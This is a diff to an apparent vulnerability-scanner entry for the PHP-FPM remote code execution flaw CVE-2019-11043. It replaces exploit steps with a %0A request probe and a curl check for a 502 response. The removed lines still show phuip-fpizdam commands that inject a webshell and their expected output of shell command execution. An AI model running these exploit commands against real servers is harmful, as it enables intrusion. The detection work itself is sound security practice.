@@ -1,5 +1,6 @@
 {
   "vuln_id": "php_fpm_cve2019_11043",
+  "dispatch_skill": "php_fpm_rce",
   "description": "PHP-FPM在特定配置下存在缓冲区溢出漏洞，可导致远程代码执行",
   "category": "config_exploit",
   "cves": [
@@ -31,20 +32,21 @@
     "/"
   ],
   "detection_method": "使用工具phuip-fpizdam检测，发送特定请求探测QSL参数，若返回502状态码则可能漏洞存在。具体：访问目标URL，观察响应状态码，工具会尝试不同qsl值，当出现502时标记为候选。",
-  "exploit_steps": [
+  "probes": [
     {
-      "step": 1,
-      "description": "使用phuip-fpizdam工具检测漏洞并获取攻击参数",
-      "command": "go run . \"http://{TARGET}/index.php\"",
-      "expected_result": "输出类似：'The target is probably vulnerable. Possible QSLs: [1785 1790 1795]' 和 'Attack params found: --qsl 1790 --pisos 152 --skip-detect'",
-      "notes": "需要安装Go环境，工具从https://github.com/neex/phuip-fpizdam获取。如果命令不成功，尝试多次请求以命中受影响进程。"
-    },
-    {
-      "step": 2,
-      "description": "利用获取的参数执行攻击，注入webshell",
-      "command": "go run . \"http://{TARGET}/index.php\" --qsl 1790 --pisos 152 --skip-detect",
-      "expected_result": "输出：'Success! Was able to execute a command by appending \"?a=/bin/sh+-c+'which+which'&\" to URLs'",
-      "notes": "参数qsl和pisos可能因目标而异，需根据第一步输出调整。漏洞只影响部分PHP-FPM子进程，可能需要多次尝试。"
+      "id": "fpm_502_probe",
+      "description": "URL 注入 %0a，观察是否 502/500（PHP-FPM 缓冲区溢出特征）",
+      "method": "GET",
+      "path": "/index.php/%0A",
+      "timeout": 8,
+      "success_signs": {
+        "status_codes": [
+          500,
+          502,
+          504
+        ]
+      },
+      "confidence": 0.7
     }
   ],
   "verification_command": "baseline=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://{TARGET}/index.php\" --max-time 5); anomaly=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://{TARGET}/index.php/%0a\" --max-time 5); echo \"BASELINE:$baseline ANOMALY:$anomaly\"; if [ \"$anomaly\" = \"502\" ] || [ \"$anomaly\" = \"500\" ]; then echo \"PHP_FPM_502_DETECTED\"; fi",
